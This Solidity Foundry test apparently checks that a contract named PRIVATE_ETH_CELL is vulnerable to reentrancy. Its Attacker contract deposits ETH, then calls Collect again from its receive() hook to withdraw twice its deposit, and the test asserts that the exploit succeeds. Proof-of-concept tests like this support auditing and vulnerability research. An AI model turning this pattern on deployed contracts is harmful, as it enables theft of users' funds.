
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {
    PRIVATE_ETH_CELL public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PRIVATE_ETH_CELL();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The contract needs to be initialized with MinSum and LogFile (done in setUp)

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PRIVATE_ETH_CELL public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = PRIVATE_ETH_CELL(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the victim contract to establish a balance
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        uint256 initialAttackerBalance = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 0;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // The attack is successful if we received more than we should have (2x the deposit due to reentrancy)
        uint256 finalAttackerBalance = address(this).balance;
        uint256 amountReceived = finalAttackerBalance - initialAttackerBalance;
        
        // If reentrancy worked, we should have received 2x the attack value
        if (amountReceived >= val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            // Re-enter the vulnerable Collect function
            victim.Collect(storedAttackVal);
        }
    }
}
